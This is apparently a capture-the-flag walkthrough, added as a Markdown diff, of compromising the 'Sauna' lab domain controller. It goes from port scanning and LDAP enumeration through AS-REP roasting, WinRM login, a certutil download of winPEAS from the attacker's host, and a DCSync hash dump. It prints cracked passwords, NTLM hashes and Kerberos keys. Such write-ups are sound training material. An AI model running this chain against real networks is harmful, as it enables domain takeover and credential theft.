@@ -1,0 +1,633 @@
+
+
+- So we start by running our masscan to identify open ports
+
+```shell
+sudo masscan -p1-65535 10.10.10.75 --rate=1000 -e tun0 > ports
+```
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Sauna]
+└─$ cat ports                                                      
+Discovered open port 88/tcp on 10.10.10.175                                    
+Discovered open port 135/tcp on 10.10.10.175                                   
+Discovered open port 49667/tcp on 10.10.10.175                                 
+Discovered open port 636/tcp on 10.10.10.175                                   
+Discovered open port 464/tcp on 10.10.10.175                                   
+Discovered open port 9389/tcp on 10.10.10.175                                  
+Discovered open port 53/tcp on 10.10.10.175                                    
+Discovered open port 139/tcp on 10.10.10.175                                   
+Discovered open port 3268/tcp on 10.10.10.175                                  
+Discovered open port 5985/tcp on 10.10.10.175                                  
+Discovered open port 49689/tcp on 10.10.10.175                                 
+Discovered open port 389/tcp on 10.10.10.175                                   
+Discovered open port 49696/tcp on 10.10.10.175                                 
+Discovered open port 49674/tcp on 10.10.10.175                                 
+Discovered open port 49673/tcp on 10.10.10.175                                 
+Discovered open port 593/tcp on 10.10.10.175                                   
+Discovered open port 80/tcp on 10.10.10.175                                    
+Discovered open port 49677/tcp on 10.10.10.175                                 
+Discovered open port 3269/tcp on 10.10.10.175 
+
+┌──(kali㉿kali)-[~/HTB/Sauna]
+└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+```
+
+- After identifying these open port, we can run a service scan with Nmap and by the look of these ports, this appears to be a Domain controller
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Sauna]
+└─$ nmap -sV -sC -p$ports -oA nmap/sauna_ports 10.10.10.175 -v
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 13:28 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 13:28
+Completed NSE at 13:28, 0.00s elapsed
+Initiating NSE at 13:28
+Completed NSE at 13:28, 0.00s elapsed
+Initiating NSE at 13:28
+Completed NSE at 13:28, 0.00s elapsed
+Initiating Ping Scan at 13:28
+Scanning 10.10.10.175 [2 ports]
+Completed Ping Scan at 13:28, 0.13s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:28
+Completed Parallel DNS resolution of 1 host. at 13:28, 0.07s elapsed
+Initiating Connect Scan at 13:28
+Scanning 10.10.10.175 [19 ports]
+Discovered open port 135/tcp on 10.10.10.175
+Discovered open port 53/tcp on 10.10.10.175
+Discovered open port 80/tcp on 10.10.10.175
+Discovered open port 593/tcp on 10.10.10.175
+Discovered open port 139/tcp on 10.10.10.175
+Discovered open port 49673/tcp on 10.10.10.175
+Discovered open port 5985/tcp on 10.10.10.175
+Discovered open port 636/tcp on 10.10.10.175
+Discovered open port 49667/tcp on 10.10.10.175
+Discovered open port 49689/tcp on 10.10.10.175
+Discovered open port 9389/tcp on 10.10.10.175
+Discovered open port 88/tcp on 10.10.10.175
+Discovered open port 49677/tcp on 10.10.10.175
+Discovered open port 49674/tcp on 10.10.10.175
+Discovered open port 3268/tcp on 10.10.10.175
+Discovered open port 464/tcp on 10.10.10.175
+Discovered open port 49696/tcp on 10.10.10.175
+Discovered open port 3269/tcp on 10.10.10.175
+Discovered open port 389/tcp on 10.10.10.175
+Completed Connect Scan at 13:28, 2.14s elapsed (19 total ports)
+Initiating Service scan at 13:28
+Scanning 19 services on 10.10.10.175
+Completed Service scan at 13:29, 68.67s elapsed (19 services on 1 host)
+NSE: Script scanning 10.10.10.175.
+Initiating NSE at 13:29
+Completed NSE at 13:30, 40.09s elapsed
+Initiating NSE at 13:30
+Completed NSE at 13:30, 5.13s elapsed
+Initiating NSE at 13:30
+Completed NSE at 13:30, 0.00s elapsed
+Nmap scan report for 10.10.10.175
+Host is up (0.36s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-14 02:28:22Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49667/tcp open  msrpc        Microsoft Windows RPC
+49673/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc        Microsoft Windows RPC
+49677/tcp open  msrpc        Microsoft Windows RPC
+49689/tcp open  msrpc        Microsoft Windows RPC
+49696/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+```
+
+### Port 80
+- So since we identified that port 80 is open on the machine, we can navigate to the page to gather any useful information
+
+![](assets/Sauna_assets/Pasted%20image%2020231113192325.png)
+
+- By looking at wappalyzer, we can verify that it is a Windows server that is running, with IIS 10.0
+
+![](assets/Sauna_assets/Pasted%20image%2020231113192429.png)
+
+- We notice that the blog section has a comment section, so we can take note of all the usernames that are specified on the page
+
+![](assets/Sauna_assets/Pasted%20image%2020231113193009.png)
+
+- we also note the writer of the blog post
+
+![](assets/Sauna_assets/Pasted%20image%2020231113193033.png)
+
+- we can also note the names of any user specified in the page
+
+![](assets/Sauna_assets/Pasted%20image%2020231113193046.png)
+
+- In the about page, we can also see the names of the employees, so we note those as well
+
+![](assets/Sauna_assets/Pasted%20image%2020231113214018.png)
+
+### SMB and RPC
+- we can try to access SMB or enumerate users with RPC but we get access denied because we don't have valid credentials
+
+![](assets/Sauna_assets/Pasted%20image%2020231113193954.png)
+
+### LDAP
+- we can use he ldap scripts in Nmap to see if we can get information about useful objects
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Sauna]
+└─$ nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.175
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 13:41 EST
+Nmap scan report for 10.10.10.175
+Host is up (0.17s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
+| ldap-search: 
+|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         instanceType: 5
+|         whenCreated: 2020/01/23 05:44:25 UTC
+|         whenChanged: 2023/11/13 10:22:56 UTC
+|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         uSNCreated: 4099
+|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
+|         uSNChanged: 98336
+|         name: EGOTISTICAL-BANK
+|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
+|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00F\xC6\xFFTH\x85uJ\xBF     \xC2\xD4\x05j\xE2\x8F\x16\x80\x01\x00\x00\x00\x00\x00\xFF\x89b\x1B\x03\x00\x00\x00\xAB\x8C\xEFx\xD1I\x85D\xB2\xC2\xED\x9Ce\xFE\xAF\xAD\x0C\xE0\x00\x00\x00\x00\x00\x00(8\xFE\x16\x03\x00\x00\x00\xDC\xD1T\x81\xF1a.B\xB4D
+|         @     \xE6\x84u\x15p\x01\x00\x00\x00\x00\x00\xD4n\x0F\x17\x03\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xD0\xF0
+|         \x15\x03\x00\x00\x00\x9B\xF0\xC5\x9Fl\x1D|E\x8B\x15\xFA/\x1A>\x13N\x14`\x01\x00\x00\x00\x00\x00\x10\xD5\x00\x17\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC     \xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
+|         creationTime: 133443445764328521
+|         forceLogoff: -9223372036854775808
+|         lockoutDuration: -18000000000
+|         lockOutObservationWindow: -18000000000
+|         lockoutThreshold: 0
+|         maxPwdAge: -36288000000000
+|         minPwdAge: -864000000000
+|         minPwdLength: 7
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1000
+|         pwdProperties: 1
+|         pwdHistoryLength: 24
+|         objectSid: 1-5-21-2966785786-3096785034-1186376766
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: \x00\x01
+|         nTMixedDomain: 0
+|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         systemFlags: -1946157056
+|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 7
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-NcType: 0
+|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+|         dc: EGOTISTICAL-BANK
+|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
+|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+...
+```
+
+- we can also run Ldapsearch as well for more information, but we are also restricted
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ ldapsearch -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" -H ldap://10.10.10.175
+# extended LDIF
+#
+# LDAPv3
+# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# EGOTISTICAL-BANK.LOCAL
+dn: DC=EGOTISTICAL-BANK,DC=LOCAL
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
+instanceType: 5
+whenCreated: 20200123054425.0Z
+whenChanged: 20231113102256.0Z
+subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+uSNCreated: 4099
+dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
+uSNChanged: 98336
+name: EGOTISTICAL-BANK
+objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
+replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAP+JY
+ hsDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
+ AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
+ TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
+creationTime: 133443445764328521
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -36288000000000
+minPwdAge: -864000000000
+minPwdLength: 7
+modifiedCountAtLastProm: 0
+nextRid: 1000
+pwdProperties: 1
+pwdHistoryLength: 24
+objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
+serverState: 1
+uASCompat: 1
+modifiedCount: 1
+auditingPolicy:: AAE=
+nTMixedDomain: 0
+rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
+ ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+systemFlags: -1946157056
+wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
+ ISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
+ m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
+ TISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
+ cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
+ EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
+ GOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
+ TISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
+ AL-BANK,DC=LOCAL
+wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
+ DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
+ TICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
+ L-BANK,DC=LOCAL
+objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
+ C=LOCAL
+isCriticalSystemObject: TRUE
+gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
+ m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
+dSCorePropagationData: 16010101000000.0Z
+otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
+ TICAL-BANK,DC=LOCAL
+otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
+ e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
+ =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+ms-DS-MachineAccountQuota: 10
+msDS-Behavior-Version: 7
+msDS-PerUserTrustQuota: 1
+msDS-AllUsersTrustQuota: 1000
+msDS-PerUserTrustTombstonesQuota: 10
+msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
+ me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
+ ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+msDS-NcType: 0
+msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+dc: EGOTISTICAL-BANK
+
+# Users, EGOTISTICAL-BANK.LOCAL
+dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Computers, EGOTISTICAL-BANK.LOCAL
+dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Domain Controllers, EGOTISTICAL-BANK.LOCAL
+dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# System, EGOTISTICAL-BANK.LOCAL
+dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# LostAndFound, EGOTISTICAL-BANK.LOCAL
+dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Infrastructure, EGOTISTICAL-BANK.LOCAL
+dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
+dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Program Data, EGOTISTICAL-BANK.LOCAL
+dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
+dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
+dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Keys, EGOTISTICAL-BANK.LOCAL
+dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# TPM Devices, EGOTISTICAL-BANK.LOCAL
+dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Builtin, EGOTISTICAL-BANK.LOCAL
+dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Hugo Smith, EGOTISTICAL-BANK.LOCAL
+dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
+ ICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
+ ICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
+ AL
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 19
+# numEntries: 15
+# numReferences: 3
+```
+
+## Exploitation
+### Kerberos : Port 88
+- so putting some of the users we could guess and also found from a file, we tried to check which one of them are valid using Kerbrute
+
+![](assets/Sauna_assets/Pasted%20image%2020231113211645.png)
+
+- but from the above list we could only get one valid user which is sauna
+
+![](assets/Sauna_assets/Pasted%20image%2020231113211626.png)
+
+- in our first list we didn't attempt to use any naming conventions or anything, so why don't try the usual `firstletteroffirstnamelastname` convention or looking at other naming conventions at
+[https://activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
+
+![](assets/Sauna_assets/Pasted%20image%2020231113224911.png)
+
+```ad-seealso
+There are other reliable methods like using a tool such as [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) to create common user name permutations with the names we've found
+```
+- and we can see that we got a hit of fsmith
+
+![](assets/Sauna_assets/Pasted%20image%2020231113224845.png)
+
+- with this valid username we've found, we can try an ASREPROASTING attack with `impacket-GetNPUsers`
+
+![](assets/Sauna_assets/Pasted%20image%2020231113224931.png)
+
+- and we got a TGT
+
+```
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:286535aa654cc51aedad6f1ff7131aba$52f634ed075d10e2ee27c95797ab9bfa249a7eaab66c842edef04f2d9dcf58f9d568cf8d938cf3400df8b2395fc8b84bb5f3fa4ec83d99e6539e20b252f985b7f07da521da9f1b1bc871fc005591f50f56a74779ec58bea8703168a0d6940678c123f3f8dff221cf54fb09e85e6c3c7ffebc463ecdd58d95d2d2245be13236770ce82706a2bb855623a845a8c1eab264fa08c7716e05b99b9fbdb4da56e86536fa3a90ba1cde0dd825b9886fd0bea74ea9e5cd053a661d67168eb657faecca4ea0d2177a7063a055dbeb8d178bb14a98a48a6fc0bb1b6cea53209aa2cff6eafc89787b78089359f2e7dc81d83a10af0103d895121b5392b65a162d41fa5d3aba
+```
+
+- we can then try to crack the TGT using john and we got a password of `Thestrokes23` 
+
+![](assets/Sauna_assets/Pasted%20image%2020231113230517.png)
+
+### Port 5985
+- since we have a set of valid credentials, now we can access the server using WinRM
+
+```shell
+evil-winrm -i 10.10.10.175 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p Thestrokes23
+```
+
+![](assets/Sauna_assets/Pasted%20image%2020231113230818.png)
+
+- Now we can view the user flag
+
+![](assets/Sauna_assets/Pasted%20image%2020231113233138.png)
+
+## Post Exploitation: Domain Privilege Escalation
+
+- We can use the python ingester for bloodhound and the credentials we have to gather information on the domain
+
+```shell
+sudo bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u fsmith -p Thestrokes23 -ns 10.10.10.175 -c all
+```
+
+- we can also get winpeas on the machine and then run it
+
+```shell
+certutil.exe -urlcache -split -f http://10.10.14.20/winPEASx64.exe winpeas.exe
+./winpeas.exe
+```
+
+- and we found some autologon credentials, so we can save them
+
+![](assets/Sauna_assets/Pasted%20image%2020231114000632.png)
+
+```
+ EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+```
+
+- so after loading the data to bloodhound, and analysing it, we found something interesting when finding users to dcsync rights, we saw that the user svc_loanmgr (which looks like the credentials for svc_loanmanager belongs too) has DCSync rights over the whole domain EGOTISTICAL-BANK.LOCAL
+
+![](assets/Sauna_assets/Pasted%20image%2020231114001553.png)
+
+- So using this, we can attempt to dump all the hashes on the DC using the impacket-secretsdump tool and the credentials we have for svc_loanmgr
+
+```shell                              
+┌──(kali㉿kali)-[~/HTB/Sauna]
+└─$ impacket-secretsdump -just-dc 'EGOTISTICALBANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175' -dc-ip 10.10.10.175 -outputfile dcsync_hashes 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:92cbc4b5b7f653ab0097e50601f030cf:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
